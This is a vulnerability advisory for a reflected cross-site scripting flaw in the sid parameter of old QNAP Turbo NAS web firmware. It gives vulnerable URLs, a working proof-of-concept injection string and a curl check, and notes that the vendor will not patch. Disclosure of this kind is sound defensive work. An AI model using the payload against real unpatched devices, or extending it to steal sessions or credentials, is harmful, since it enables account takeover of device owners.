Status
====================

Published

====================
Tested versions
====================

This vulnerability was tested on the following QNAP devices:

– TS-109 PRO and TS-109 II Version 3.3.0 Build 0924T
– TS-209 and TS-209 PRO II Version 3.3.3 Build 1003T

====================
Details
====================

The QNAP NAS Management Software, embedded as firmware, is accessible
via a web-based interface on all Turbo NAS devices. A vulnerability in
the sid variables in cgi-bin/user_index.cgi and cgi-bin/index.cgi
allows a remote unauthenticated attacker to inject arbitrary
JavaScript which is executed server-side by escaping from the
quotation marks.

An attacker may exploit the reflected XSS vulnerability to cause a
victim to execute the malicious JavaScript code within the user’s
browser. The malicious code can perform, but is not limited to,
stealing a victim’s session token or login credentials, log the
victim’s keystrokes, or perform arbitrary actions on the victim’s
behalf.

====================
Vulnerable URLs:
====================

http://target:8080/cgi-bin/user_index.cgi
http://target:8080/cgi-bin/index.cgi

====================
XSS Proof-of-concept (POC)
====================

The following proof-of-concept (POC) demonstrates the injection:

http://target:8080/cgi-bin/user_index.cgi?sid=%22%3balert%28%22XSS%22%29%2f%2f
http://target:8080/cgi-bin/index.cgi?sid=%22%3balert%28%22XSS%22%29%2f%2f

# Example

$ curl -A "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101
Firefox/31.0 Iceweasel/31.8.0"
'http://<redacted>:8080/cgi-bin/user_index.cgi?sid=";alert("XSS")//'
-s | grep XSS

var sid = "";alert("XSS")//";

====================
Vulnerability solution
====================

QNAP have advised that they will not release a new firmware to address
the vulnerabilities.
